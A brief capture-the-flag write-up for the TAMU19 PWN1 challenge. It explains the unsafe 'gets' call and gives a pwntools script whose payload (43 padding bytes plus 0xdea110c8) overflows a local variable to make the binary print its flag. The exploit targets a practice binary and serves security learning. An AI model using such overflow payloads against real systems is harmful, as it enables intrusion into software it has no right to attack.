# TAMU19 PWN1
PWN1 is a easy buffer overflow challenge, we have 3 input calls 2 of those are `fgets` and the last one is a `gets` function call, this one is vulnerable since
`gets` reads input until it finds a `\n` newline character.

We need to overflow the value at address `[ebp-0x10]` with the value `0xdea110c8` and it will print our flag

I made the following script to complete the challenge
```py
from pwn import *

io = process("./pwn1")
TEXT_1 = b"Sir Lancelot of Camelot"
TEXT_2 = b"To seek the Holy Grail."

io.sendline(TEXT_1)
io.sendline(TEXT_2)

PAYLOAD = b"A" * 43 + b"\xc8\x10\xa1\xde"
io.sendline(PAYLOAD)
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
print(io.recvline().decode("ASCII"))
```
